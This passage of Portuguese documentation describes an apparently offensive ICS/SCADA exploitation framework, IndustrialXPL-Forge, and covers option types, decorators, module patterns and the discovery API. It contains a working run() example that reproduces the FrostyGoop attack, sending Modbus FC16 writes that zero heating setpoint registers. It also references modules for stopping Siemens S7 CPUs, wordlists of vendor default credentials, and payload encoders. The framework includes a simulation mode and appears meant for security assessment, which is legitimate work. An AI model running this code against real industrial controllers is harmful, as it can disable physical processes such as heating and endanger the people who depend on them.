ixf (PROFINET DCP Identify) > set target_mac 00:11:22:33:44
[-] Erro de validação para 'target_mac': '00:11:22:33:44' is not a valid MAC address.
```

---

### `OptWordlist`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita um caminho para um arquivo de wordlist. Três formatos de entrada são suportados. O arquivo deve existir e ser legível no momento da validação.

**Construtor:**
```python
OptWordlist(default: str, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Remover espaços em branco.
2. Se o valor começa com `file://`, remover esse prefixo para obter o caminho absoluto.
3. Se o caminho resultante não for absoluto, juntá-lo com `WORDLISTS_DIR` (`industrialxpl/resources/wordlists/`).
4. Se o caminho não estiver vazio e `os.path.isfile(path)` retornar False, levantar `OptionValidationError`.

**Três formatos de entrada suportados:**

| Formato | Exemplo | Resolução |
|---------|---------|-----------|
| Nome relativo (basename apenas) | `ics_common_passwords.txt` | Resolvido para `industrialxpl/resources/wordlists/ics_common_passwords.txt` |
| Caminho absoluto de sistema de arquivos | `/opt/wordlists/rockyou.txt` | Usado como está |
| URI `file://` | `file:///opt/wordlists/custom.txt` | Remove prefixo `file://`, usa o resto como caminho absoluto |

**Wordlists embutidas** (em `industrialxpl/resources/wordlists/`):

| Nome do Arquivo | Conteúdo |
|-----------------|---------|
| `ics_common_passwords.txt` | Senhas padrão comuns ICS/SCADA |
| `plc_usernames.txt` | Lista comum de usuários PLC/HMI |
| `siemens_default_creds.txt` | Credenciais padrão de produtos Siemens |
| `rockwell_default_creds.txt` | Credenciais padrão Rockwell/Allen-Bradley |
| `schneider_default_creds.txt` | Credenciais padrão Schneider Electric |
| `modbus_unit_ids.txt` | Unit IDs Modbus comuns para enumerar |

**Sessão de terminal:**
```
ixf (S7 Default Creds) > set wordlist ics_common_passwords.txt
[*] wordlist => ics_common_passwords.txt

ixf (S7 Default Creds) > set wordlist file:///opt/custom_passwords.txt
[*] wordlist => file:///opt/custom_passwords.txt

ixf (S7 Default Creds) > set wordlist /opt/wordlists/rockyou.txt
[*] wordlist => /opt/wordlists/rockyou.txt

ixf (S7 Default Creds) > set wordlist nonexistent.txt
[-] Erro de validação para 'wordlist': Wordlist file not found: /path/to/industrialxpl/resources/wordlists/nonexistent.txt

ixf (S7 Default Creds) > set wordlist file:///opt/missing.txt
[-] Erro de validação para 'wordlist': Wordlist file not found: /opt/missing.txt
```

---

### `OptEncoder`

**Arquivo:** `industrialxpl/core/exploit/option.py`

Aceita uma string de nome de encoder. Nenhuma validação de formato é realizada — o valor é passado diretamente para o pipeline de encoding. Este é o tipo de opção mais permissivo.

**Construtor:**
```python
OptEncoder(default: str, description: str, *, advanced: bool = False)
```

**Lógica de validação:**
1. Retornar `str(value).strip()` — sempre bem-sucedido.

**Valores de encoder comuns:**

| Valor | Efeito |
|-------|--------|
| `""` | Sem encoding (bytes brutos) |
| `"base64"` | Codificar payload em Base64 |
| `"hex"` | Codificar payload em hexadecimal |
| `"raw"` | Encoding bruto explícito (mesmo que vazio) |
| `"xor:0x41"` | XOR de cada byte com `0x41` |
| `"url"` | URL-encode do payload |

**Declarações de exemplo:**
```python
encoder = OptEncoder("", "Encoder de saída para payload gerado (base64, hex, raw, xor:KEY)")
```

**Sessão de terminal:**
```
ixf (S7 Stop CPU) > set encoder base64
[*] encoder => base64

ixf (S7 Stop CPU) > set encoder hex
[*] encoder => hex

ixf (S7 Stop CPU) > set encoder xor:0xff
[*] encoder => xor:0xff

ixf (S7 Stop CPU) > set encoder ""
[*] encoder => 
```

---

### Opções Avançadas

Qualquer opção pode ser marcada com `advanced=True` no seu construtor. Opções avançadas:

- São ocultas da saída de `show options`.
- São visíveis na saída de `show advanced`.
- Se comportam de forma idêntica a opções regulares em todos os outros aspectos.
- Ainda podem ser definidas com `set <opção> <valor>`.

**Declarações de exemplo:**
```python
verbose     = OptBool(False,  "Habilitar saída de debug detalhada",           advanced=True)
timeout     = OptInteger(5,   "Override de timeout de conexão (segundos)",    advanced=True)
jitter      = OptFloat(0.0,   "Jitter aleatório adicionado a delays (s)",     advanced=True)
user_agent  = OptString("",   "Cabeçalho User-Agent HTTP customizado",        advanced=True)
verify_cert = OptBool(True,   "Verificar cadeia de certificado TLS/SSL",      advanced=True)
```

**Exibição no shell:**
```
ixf (Ignition RCE) > show options

  Opções do Módulo (exploits/scada/ignition/ignition_rce)
  ─────────────────────────────────────────────────────────────────
  Nome          Atual       Obrig.    Descrição
  ────          ─────       ──────    ─────────
  target                    sim       IP ou hostname do dispositivo alvo
  port          8088        sim       Porta HTTP do Ignition Gateway
  simulate      True        sim       Modo simulação (padrão: True)
  destructive   False       sim       Habilitar exploração ao vivo

ixf (Ignition RCE) > show advanced

  Opções Avançadas
  ─────────────────────────────────────────────────────────────────
  Nome          Atual       Descrição
  ────          ─────       ─────────
  verbose       False       Habilitar saída de debug detalhada
  timeout       5           Override de timeout de conexão (segundos)
  verify_cert   True        Verificar cadeia de certificado TLS/SSL
```

---

## Decoradores

### `@mute`

**Arquivo:** `industrialxpl/core/exploit/exploit.py`

O decorador `@mute` suprime toda a saída padrão gerada dentro da função decorada. Faz isso apontando o `thread_output_stream.stream` local da thread para uma instância de `_DummyFile` cujos métodos `write()` e `flush()` são no-ops. Após o retorno da função (ou levantamento de exceção), o stream é redefinido para `None`.

**Propósito:** `check()` frequentemente é chamado de forma concorrente em muitos alvos em uma varredura multi-thread (`run_threads()`). Sem `@mute`, a saída de impressão de diferentes threads se entrelaçaria de forma imprevisível. Com `@mute`, a proba de check roda silenciosamente e o coordenador de thread imprime um resumo limpo.

**Uso:** Sempre aplique `@mute` a `check()`. Não aplique a `run()`.

```python
from industrialxpl.core.exploit import Exploit, OptIP, OptPort, mute

class Exploit(Exploit):
    __info__ = { ... }
    target = OptIP("", "IP alvo")
    port   = OptPort(502, "Porta")

    @mute
    def check(self) -> bool:
        """Este método roda silenciosamente — todas as chamadas print_* são suprimidas."""
        if not self.target:
            return False
        try:
            import socket
            s = socket.socket()
            s.settimeout(3)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """Este método NÃO é muted — saída é visível."""
        # Chamadas print_* aqui aparecem normalmente no terminal
        ...
```

**O que acontece dentro de @mute:**
```python
# Código-fonte do decorador mute:
def mute(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        thread_output_stream.stream = _DummyFile()  # redirecionar para /dev/null
        try:
            return fn(*args, **kwargs)              # executar função silenciosamente
        finally:
            thread_output_stream.stream = None      # restaurar stdout
    return wrapper
```

---

### `@multi`

**Arquivo:** `industrialxpl/core/exploit/exploit.py`

O decorador `@multi` habilita um módulo a aceitar um arquivo de alvos via esquema URI `file://`. Quando `self.target` começa com `"file://"`, o decorador abre o arquivo no caminho após `file://`, lê cada linha não vazia e não comentada, e chama a função decorada uma vez por linha com `self.target` definido para aquela linha.

**Propósito:** Permite que uma única invocação de `run` faça uma varredura de uma lista de alvos sem modificar a lógica central do módulo.

**Formato do arquivo de alvos:**
- Um endereço IP ou hostname por linha.
- Linhas começando com `#` são tratadas como comentários e ignoradas.
- Linhas em branco são ignoradas.
- Nenhuma expansão de shell ou padrões glob são suportados.

**Exemplo de arquivo de alvos (`/opt/targets.txt`):**
```
# Dispositivos Modbus TCP — Planta A
192.168.10.1
192.168.10.2
192.168.10.3
# HMIs da sala de controle
10.0.1.100
10.0.1.101
```

**Uso:**
```python
from industrialxpl.core.exploit import Exploit, OptIP, OptPort, multi, print_status

class Exploit(Exploit):
    __info__ = { ... }
    target = OptIP("", "IP alvo ou file:///caminho/para/alvos.txt")
    port   = OptPort(502, "Porta")

    @multi
    def run(self) -> None:
        # self.target é definido para a linha atual do arquivo
        # Este corpo é chamado uma vez por alvo
        print_status("Varrendo {}:{}".format(self.target, self.port))
        # ... lógica de scan real ...
```

**Sessão de shell:**
```
ixf (Modbus Detect) > set target file:///opt/targets.txt
[*] target => file:///opt/targets.txt

ixf (Modbus Detect) > run
[*] [multi] Alvo: 192.168.10.1
[*] Varrendo 192.168.10.1:502...
[+] Dispositivo Modbus encontrado em 192.168.10.1 (unit 1)

[*] [multi] Alvo: 192.168.10.2
[*] Varrendo 192.168.10.2:502...
[-] Sem resposta Modbus de 192.168.10.2

[*] [multi] Alvo: 192.168.10.3
[*] Varrendo 192.168.10.3:502...
[+] Dispositivo Modbus encontrado em 192.168.10.3 (unit 1)
```

**Tratamento de erros:** Se o arquivo de alvos não puder ser aberto (arquivo ausente, permissão negada), o decorador levanta `RuntimeError: Cannot open target file: <mensagem de erro do OS>`.

---

## Padrões de Método

### Padrão `check()`

`check()` é a proba de conectividade e verificação de vulnerabilidade somente-leitura do módulo. O shell chama `check()` automaticamente antes de `run()` em alguns fluxos de trabalho, e diretamente quando o usuário executa o comando `check`.

**Requisitos estritos:**

1. Deve ser decorado com `@mute` — sempre.
2. Deve retornar `bool` — `True` se o alvo parece presente/vulnerável, `False` caso contrário.
3. Nunca deve enviar payloads de exploit. Apenas probas benignas: conexão TCP, grab de banner, PDU de protocolo somente-leitura mínima.
4. Deve tratar todas as exceções internamente e retornar `False` em qualquer erro.
5. Deve retornar `False` imediatamente se `self.target` estiver vazio.
6. Deve respeitar `self.timeout`.

**Exemplo anotado completo (verificação de banner Modbus):**

```python
@mute
def check(self) -> bool:
    """Testa se o alvo responde ao Modbus TCP na porta configurada.

    Envia uma única requisição Modbus FC3 (Read Holding Registers) para
    o registrador 0, quantidade 1. Uma resposta válida de cabeçalho
    Modbus (>=8 bytes) indica um dispositivo Modbus ativo.

    Retorna:
        True  — Alvo respondeu com uma resposta em formato Modbus.
        False — Alvo inacessível, porta errada, ou serviço Modbus ausente.
    """
    # Guarda: alvo deve estar definido antes de tentar conexão
    if not self.target:
        return False

    try:
        # Abrir socket TCP com timeout configurado
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        # Cabeçalho MBAP (6 bytes): Transaction=0x0001, Protocol=0x0000, Length=0x0006
        # PDU: Unit=0x01, FC03=0x03, Start=0x0000, Count=0x0001
        probe = bytes.fromhex("000100000006010300000001")
        sock.sendall(probe)

        # Uma resposta mínima contém cabeçalho MBAP de 6 bytes +
        # unit ID (1) + FC (1) + byte count (1) + data (2) = 11 bytes
        response = sock.recv(64)
        sock.close()

        # Resposta Modbus válida: ao menos 8 bytes, protocol ID = 0x0000
        if len(response) >= 8:
            protocol_id = (response[2] << 8) | response[3]
            return protocol_id == 0x0000

        return False

    except (socket.timeout, ConnectionRefusedError, OSError):
        return False
    except Exception:
        return False
```

**check() mínimo para módulos sem proba de rede:**

```python
@mute
def check(self) -> bool:
    """Verificação trivial — retorna True se o alvo está definido."""
    return bool(self.target)
```

**check() com inspeção de banner específico do vendor (Siemens S7):**

```python
@mute
def check(self) -> bool:
    """Verifica Siemens S7-1200 inspecionando o handshake COTP/S7comm."""
    if not self.target:
        return False
    try:
        sock = socket.socket()
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        # TPKT + COTP Connection Request (sequência padrão de conexão S7)
        cotp_cr = bytes.fromhex(
            "0300001611e00000001400c1020100c2020102c0010a"
        )
        sock.sendall(cotp_cr)
        resp = sock.recv(32)
        sock.close()

        # COTP Connection Confirm começa com 0x03 0x00 ... 0xD0
        return len(resp) > 5 and resp[0] == 0x03 and resp[5] == 0xD0

    except Exception:
        return False
```

---

### Padrão `run()`

`run()` é o ponto de entrada de execução principal do módulo. O shell o chama quando o usuário emite o comando `run` ou `exploit`.

**Requisitos estritos:**

1. Deve validar `self.target` primeiro e retornar com erro se não definido.
2. Se `self.simulate` é `True`: chamar `DestructiveGate.print_simulation()` e retornar imediatamente. Nenhum pacote enviado.
3. Se `self.simulate` é `False`: implementar a lógica real de exploit, scan ou assessment.
4. Não deve chamar `DestructiveGate.require_confirmation()` diretamente — o shell trata esse portão antes de chamar `run()`.
5. Deve usar apenas `print_status`, `print_success`, `print_error`, `print_warning`, `print_info` para saída.

**run() completo anotado com ramos simulate / ao vivo:**

```python
def run(self) -> None:
    """Executa o ataque de aquecimento estilo FrostyGoop ou imprime simulação.

    Em modo simulação: imprime a cadeia exata de ataque, payload hex e
    técnicas MITRE sem enviar nenhum tráfego.

    Em modo ao vivo (simulate=False + destructive=True após confirmação):
    envia comandos Modbus FC16 para zerar registradores de setpoint.
    """
    # ── Validar opções obrigatórias ────────────────────────────────────────
    if not self.target:
        print_error(
            "Defina 'target' primeiro. "
            "Exemplo: set target 192.168.1.100"
        )
        return

    # ── Caminho de simulação — absolutamente nenhum pacote ────────────────
    if self.simulate:
        DestructiveGate.print_simulation(
            description=(
                "FrostyGoop TTP (2024) — Sandworm/GRU (Rússia)\n\n"
                "Fase 1 [Descoberta]: Varredura de porta Modbus TCP 502 em {target}\n"
                "Fase 2 [FC16 Write]: Escrita de 0x0000 nos registradores de aquecimento\n"
                "Fase 3 [Loop]: Repetição a cada 30s para impedir recuperação manual\n"
                "Impacto Físico: Controladores de aquecimento offline — 600 apartamentos "
                "em Lviv, Ucrânia perderam calefação por 2 dias (janeiro 2024)"
            ).format(target=self.target),
            payload_hex=(
                "00 01 00 00 00 0B {unit} 10 00 00 00 02 04 "
                "00 00 00 00"
            ).format(unit=format(self.unit_id, "02x")),
            payload_human=(
                "Modbus FC16 Write Multiple Registers: "
                "address=0x0000, count=2, values=[0x0000, 0x0000] "
                "(zerar registradores de setpoint de aquecimento)"
            ),
            mitre_techniques=["T0836", "T0814"],
        )
        return

    # ── Caminho de exploit ao vivo ─────────────────────────────────────────
    # A execução chega aqui somente quando:
    #   1. simulate=False
    #   2. destructive=True
    #   3. DestructiveGate.require_confirmation() retornou True (tratado pelo shell)

    print_status(
        "[FrostyGoop] Conectando a {}:{} (unit {})...".format(
            self.target, self.port, self.unit_id
        )
    )

    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        print_status("[FrostyGoop] Conexão estabelecida.")

        # Construir PDU Modbus FC16 Write Multiple Registers
        def build_fc16(unit: int, address: int, values: list) -> bytes:
            count = len(values)
            byte_count = count * 2
            data = b"".join(v.to_bytes(2, "big") for v in values)
            length = 7 + byte_count
            return (
                b"\x00\x01\x00\x00"
                + length.to_bytes(2, "big")
                + bytes([unit, 0x10])
                + address.to_bytes(2, "big")
                + count.to_bytes(2, "big")
                + bytes([byte_count])
                + data
            )

        payload = build_fc16(self.unit_id, 0x0000, [0x0000, 0x0000])
        sock.sendall(payload)
        response = sock.recv(12)
        sock.close()

        if len(response) >= 8 and response[7] == 0x10:
            print_success(
                "[FrostyGoop] Escrita FC16 confirmada — registradores de "
                "aquecimento zerados em {}:{}".format(self.target, self.port)
            )
        else:
            print_error("[FrostyGoop] Resposta inesperada — escrita pode ter falhado.")

    except ConnectionRefusedError:
        print_error(
            "Conexão recusada em {}:{} — porta Modbus pode estar fechada.".format(
                self.target, self.port
            )
        )
    except socket.timeout:
        print_error("Timeout de conexão após {}s.".format(self.timeout))
    except Exception as exc:
        print_error("Erro inesperado durante execução: {}".format(exc))
```

---

## Método `get_info()`

**Definido em:** `industrialxpl/core/exploit/exploit.py` (classe `BaseExploit`)

`get_info()` recupera o dicionário `__info__` para qualquer módulo carregado.

**Código-fonte:**
```python
def get_info(self) -> dict:
    """Retorna o dict __info__ do módulo (sobrevive ao name mangling da metaclasse)."""
    for cls in type(self).__mro__:
        key = "_{name}__info__".format(name=cls.__name__)
        val = cls.__dict__.get(key)
        if val is not None:
            return val
    return {}
```

**Como funciona:**
1. Itera pelo MRO (Method Resolution Order) da classe — a lista de classes do mais derivado ao mais base.
2. Para cada classe no MRO, constrói o nome de chave mangled `_{NomeClasse}__info__`.
3. Verifica `cls.__dict__` diretamente (não `getattr`, para evitar busca de descritor).
4. Retorna o primeiro valor não-None encontrado.
5. Retorna `{}` se nenhum `__info__` for encontrado em qualquer parte da hierarquia.

**Uso programático:**
```python
from industrialxpl.core.exploit.utils import import_exploit

# Carregar a classe e instanciar
ExploitClass = import_exploit(
    "industrialxpl.modules.cve.malware.frostygoop_modbus_heating"
)
module_instance = ExploitClass()

# Recuperar metadados
info = module_instance.get_info()

print(info["name"])             # FrostyGoop Modbus Heating Attack (Extended)
print(info["impact"])           # CATASTROPHIC
print(info["cve"])              # N/A
print(info["mitre_techniques"]) # ['T0836', 'T0814']
print(info["authors"])          # ('Andre Henrique (@mrhenrike) | Uniao Geek',)

# Acessar todos os campos
for key, value in info.items():
    print("{:25s}: {}".format(key, value))
```

**Uso via `show info` no shell:**
```
ixf (FrostyGoop Modbus Heating) > show info

  Módulo: cve/malware/frostygoop_modbus_heating
  ─────────────────────────────────────────────────────────────────
  Nome:        FrostyGoop Modbus Heating Attack (Extended)
  Descrição:   Replica o TTP FrostyGoop usado pelo Sandworm/GRU em
               janeiro de 2024 para desabilitar aquecimento em 600
               apartamentos em Lviv, Ucrânia.
  Autores:     Andre Henrique (@mrhenrike) | Uniao Geek
  CVE:         N/A (TTP de malware — sem CVE atribuído)
  CVSS:        N/A
  Severidade:  CATASTROPHIC
  Impacto:     CATASTROPHIC
  Dispositivos: Controladores Modbus RTU/TCP de aquecimento
  Técnicas:    T0836 (Modify Parameter), T0814 (Denial of Control)
  Táticas:     Impair Process Control, Impact
```

---

## Enum de Protocolo

**Definido em:** `industrialxpl/core/exploit/exploit.py` (classe `Protocol`)

A classe `Protocol` é um namespace de constantes de string usadas para definir `target_protocol` nas classes de exploit.

**Todas as constantes:**

| Atributo | Valor string | Protocolo / Transporte |
|----------|-------------|------------------------|
| `Protocol.CUSTOM` | `"custom"` | Protocolo desconhecido ou genérico |
| `Protocol.TCP` | `"custom/tcp"` | TCP bruto (sem protocolo de aplicação) |
| `Protocol.UDP` | `"custom/udp"` | UDP bruto |
| `Protocol.FTP` | `"ftp"` | File Transfer Protocol |
| `Protocol.SFTP` | `"sftp"` | SSH File Transfer Protocol |
| `Protocol.SSH` | `"ssh"` | Secure Shell |
| `Protocol.TELNET` | `"telnet"` | Telnet (comum em dispositivos OT legados) |
| `Protocol.HTTP` | `"http"` | HTTP (interfaces web SCADA, APIs REST HMI) |
| `Protocol.HTTPS` | `"https"` | HTTPS |
| `Protocol.SNMP` | `"snmp"` | SNMP (gerenciamento de dispositivos de rede) |
| `Protocol.MODBUS` | `"modbus/tcp"` | Modbus TCP (compatível IEC 61158) |
| `Protocol.S7` | `"s7comm"` | Siemens S7comm / S7comm-Plus (porta 102) |
| `Protocol.ENIP` | `"ethernet/ip"` | EtherNet/IP (CIP sobre TCP/UDP, porta 44818) |
| `Protocol.DNP3` | `"dnp3"` | DNP3 (Distributed Network Protocol, porta 20000) |
| `Protocol.BACNET` | `"bacnet/ip"` | BACnet/IP (ASHRAE 135, porta 47808 UDP) |

**Uso em um módulo:**
```python
from industrialxpl.core.exploit.exploit import Protocol

class Exploit(Exploit):
    __info__ = { ... }
    target_protocol = Protocol.MODBUS  # Declara que este módulo visa Modbus TCP
```

**Protocolos personalizados (não no enum):**
```python
target_protocol = "iec60870-5-104"   # IEC 60870-5-104 (T104)
target_protocol = "profinet/dcp"     # PROFINET DCP
target_protocol = "mms"              # MMS (IEC 61850)
target_protocol = "srtp"             # GE SRTP
target_protocol = "opcua"            # OPC UA
target_protocol = "fins"             # Omron FINS
target_protocol = "melsec"           # Mitsubishi MELSEC
```

---

## Metaclasse: ExploitOptionsAggregator

**Definida em:** `industrialxpl/core/exploit/exploit.py`

`ExploitOptionsAggregator` é a metaclasse Python que alimenta o sistema de opções do IXF e o tratamento de `__info__`. É executada uma vez por definição de classe no momento da importação, não na criação da instância.

**O que ela faz:**

1. **Herda `exploit_attributes` das classes base.** Mescla os dicionários `exploit_attributes` de todas as classes base. Isso significa que as opções `simulate` e `destructive` declaradas em `BaseExploit` estão automaticamente disponíveis em todos os módulos sem re-declaração.

2. **Coleta descritores `Option`.** Para cada atributo de classe que é uma instância de `Option` (ou seja, `OptIP`, `OptPort`, etc.):
   - Define `value.label = key` para que o descritor saiba seu próprio nome.
   - Adiciona uma entrada a `exploit_attributes[key]` = `[valor_exibição, descrição, flag_avançado]`.

3. **Faz mangling de `__info__`.** Se o corpo da classe contém uma chave `__info__`, a metaclasse a renomeia para `_{NomeClasse}__info__` e deleta a chave original.

**Como `exploit_attributes` funciona:**

Após a criação da classe, `Exploit.exploit_attributes` é um dict como:

```python
{
    "simulate":    [True,  "Modo simulação: descreve a ação sem ...", False],
    "destructive": [False, "Habilitar exploração ao vivo ...",        False],
    "target":      ["",    "IP ou hostname do dispositivo alvo",      False],
    "port":        [502,   "Porta Modbus TCP",                        False],
    "unit_id":     [1,     "Modbus unit ID (1-247)",                  False],
    "timeout":     [5,     "Timeout de conexão (segundos)",           True],  # avançado
}
```

Cada entrada: `[valor_padrão, string_descrição, is_avançado_bool]`.

---

## API de Descoberta

### `import_exploit()`

**Arquivo:** `industrialxpl/core/exploit/utils.py`

Importa um módulo pelo seu caminho Python completo com pontos e retorna a primeira classe encontrada com nome `Exploit`, `Scanner` ou `Assessment`.

**Assinatura:**
```python
def import_exploit(path: str) -> type
```

**Uso:**
```python
from industrialxpl.core.exploit.utils import import_exploit

# Carregar uma classe de módulo pelo seu caminho completo com pontos
ExploitClass = import_exploit(
    "industrialxpl.modules.cve.siemens.cve_2021_22681_s7_1200_hardcoded_key"
)

# Instanciar
module = ExploitClass()

# Configurar opções programaticamente
module.target = "192.168.1.100"
module.port = 102
module.simulate = True

# Usar get_info() para acessar metadados
info = module.get_info()
print(info["name"])    # CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Key
print(info["impact"])  # CRITICAL

# Executar a proba check
reachable = module.check()
print("Acessível:", reachable)

# Executar o módulo (modo simulação — nenhum pacote enviado)
module.run()
```

### `index_modules()`

**Arquivo:** `industrialxpl/core/exploit/utils.py`

Percorre a árvore de diretórios `industrialxpl/modules/` e retorna uma lista ordenada de todos os caminhos de módulo importáveis.

**Assinatura:**
```python
def index_modules(modules_directory: str = MODULES_DIR) -> list[str]
```

**Exemplos de filtragem:**
```python
from industrialxpl.core.exploit.utils import index_modules

all_modules = index_modules()

# Todos os módulos que visam produtos Siemens
siemens = [m for m in all_modules if "siemens" in m]

# Todos os módulos de técnica MITRE ATT&CK
mitre = [m for m in all_modules if m.startswith("assessment.mitre_ics.t")]

# Todos os módulos scanner
scanners = [m for m in all_modules if m.startswith("scanners.")]

# Todos os módulos CVE
cve_mods = [m for m in all_modules if m.startswith("cve.")]

# Módulos relacionados a Modbus
modbus = [m for m in all_modules if "modbus" in m]

print(f"Total de módulos: {len(all_modules)}")
print(f"Módulos MITRE ICS: {len(mitre)}")
print(f"Módulos scanner: {len(scanners)}")
```

**Exclusões:** Diretórios listados em `DISABLED_DOMAINS` são pulados:
```python
DISABLED_DOMAINS = {"__pycache__", "_native"}
```

Isso significa que `cve/malware/_native/` (código de malware compilado) nunca é retornado por `index_modules()`.

---

## Validação de Módulo

Após escrever um novo módulo, verifique se ele carrega corretamente e passa na validação antes de usá-lo no shell.

**Teste de importação rápida (módulo único):**
```bash
cd D:\Projetos-SafeLabs\submodules\OT\IndustrialXPL-Forge
python -c "
from industrialxpl.core.exploit.utils import import_exploit
cls = import_exploit('industrialxpl.modules.cve.siemens.cve_2021_22681_s7_1200_hardcoded_key')
obj = cls()
info = obj.get_info()
print('[OK]', info['name'])
print('     Impacto:', info['impact'])
print('     CVE:   ', info['cve'])
"
```

Saída esperada:
```
[OK] CVE-2021-22681 Siemens S7-1200/1500 Hardcoded Crypto Key
     Impacto: CRITICAL
     CVE:    CVE-2021-22681
```

**Validação completa da árvore de módulos:**
```bash
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit

mods = index_modules()
errors = []
warnings = []

for m in mods:
    try:
        cls = import_exploit('industrialxpl.modules.' + m)
        obj = cls()
        info = obj.get_info()
        if not info:
            warnings.append((m, '__info__ vazio'))
        elif 'name' not in info:
            warnings.append((m, 'chave name ausente em __info__'))
    except Exception as e:
        errors.append((m, str(e)))

print(f'Verificados: {len(mods)} módulos')
print(f'Erros:       {len(errors)}')
print(f'Avisos:      {len(warnings)}')

if errors:
    print()
    print('ERROS:')
    for m, e in errors:
        print(f'  [ERR] {m}')
        print(f'        {e}')

if not errors and not warnings:
    print('Todos os módulos carregados e validados com sucesso.')
"
```

Saída esperada (árvore saudável):
```
Verificados: 87 módulos
Erros:       0
Avisos:      0
Todos os módulos carregados e validados com sucesso.
```

Saída quando um módulo tem erros:
```
Verificados: 88 módulos
Erros:       1
Avisos:      0

ERROS:
  [ERR] cve.siemens.meu_novo_modulo
        Cannot import 'industrialxpl.modules.cve.siemens.meu_novo_modulo':
        No module named 'struct2'
```

---

## Exemplo Completo de Módulo

Veja [Desenvolvimento de Módulos](09-desenvolvimento-modulos.md) para o template completo de módulo de produção com todos os padrões, anotado linha por linha.

---

*Anterior: [Referência do Shell](03-referencia-shell.md) | Próximo: [SafeMode / DestructiveMode](05-safemode-destructivemode.md)*
